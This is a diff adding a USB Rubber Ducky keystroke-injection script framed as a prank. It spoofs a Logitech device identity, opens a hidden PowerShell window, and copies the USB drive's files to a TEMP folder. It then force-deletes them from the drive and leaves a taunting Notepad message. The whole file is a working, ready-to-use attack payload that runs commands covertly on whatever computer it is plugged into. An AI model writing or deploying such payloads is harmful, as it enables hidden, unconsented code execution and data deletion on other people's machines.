@@ -1,0 +1,49 @@
+ATTACKMODE HID STORAGE VID_046D PID_C31C MAN_HAK5 PROD_DUCKY SERIAL_1337
+REM Simple file deleter prank - copies and zips your ducky's files to TEMP and deletes the files on the usb
+REM REMEMBER TO REPLACE YOUR DRIVE NAME IN LINE 12 TO YOUR DUCKY'S NAME!!
+
+BUTTON_DEF
+    DELAY 1000
+    REM Open PowerShell
+    GUI r
+    DELAY 500
+    STRING powershell -WindowStyle Hidden
+    ENTER
+    DELAY 1000
+
+    REM Find the USB drive by name (replace 'USB_DRIVE_NAME' with the actual name of your USB)
+    STRING $usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'USB_DRIVE_NAME' }
+    ENTER
+    DELAY 1000
+
+    REM Copy files from the USB to a hidden folder in the temp directory
+    STRING mkdir $env:TEMP\usbbackup
+    ENTER
+    DELAY 500
+    STRING Copy-Item -Path "$($usb.DriveLetter):\*" -Destination "$env:TEMP\usbbackup" -Recurse -Force
+    ENTER
+    DELAY 3000
+
+    REM Zip the files into a backup zip file
+    STRING Compress-Archive -Path "$env:TEMP\usbbackup\*" -DestinationPath "$env:TEMP\usbbackup.zip"
+    ENTER
+    DELAY 3000
+
+    REM Delete the files from the USB drive to simulate data loss
+    STRING Remove-Item -Path "$($usb.DriveLetter):\*" -Recurse -Force
+    ENTER
+    DELAY 2000
+
+    REM Close PowerShell
+    STRING exit
+    ENTER
+
+    REM leave the user a little parting gift...
+    GUI r
+    DELAY 500
+    STRING notepad
+    ENTER
+    DELAY 500
+    STRING Where are your files??? Hint: don't clear your cache ;)
+END_BUTTON
+
